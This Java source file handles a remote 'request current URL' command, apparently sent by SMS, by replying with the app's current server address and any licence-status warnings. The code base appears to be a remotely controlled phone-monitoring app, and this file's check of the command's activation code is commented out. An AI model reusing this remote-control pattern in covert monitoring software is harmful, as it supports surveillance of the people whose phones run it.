package com.vvt.remotecommandmanager.processor.troubleshoot;

import com.vvt.appcontext.AppContext;
import com.vvt.base.security.Constant;
import com.vvt.base.security.FxSecurity;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.server_address_manager.ServerAddressManager;
import com.vvt.stringutil.FxStringUtils;

public class RequestCurrentlyURLProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RequestCurrentlyURLProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private ServerAddressManager mServerAddressManager;
	private StringBuilder mReplyMessageBuilder;
	
	public RequestCurrentlyURLProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo,  ServerAddressManager serverAddressManager) {
		super(appContext, eventRepository);
		
		mServerAddressManager = serverAddressManager;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		//not require arguments
//		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {
			
			String structuredServerUrl = mServerAddressManager.getStructuredServerUrl();
			String newUrl = FxStringUtils.removeEnd(structuredServerUrl, "/");
			newUrl = FxStringUtils.removeEnd(newUrl, FxSecurity.getConstant(Constant.GATEWAY));
			
			mReplyMessageBuilder.append("Currrent URL is " + newUrl);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
		} catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());

			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.REQUEST_CURRENT_URL_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}
	
//	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
//		
//		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
//			//Command should only have 1 arguments.
//			if(commandData.getArguments().size() != 1 ) {
//				throw new InvalidCommandFormatException();
//			}
//		
//			//if invalid activation code it will throw exception.
//			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
//		}
//	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
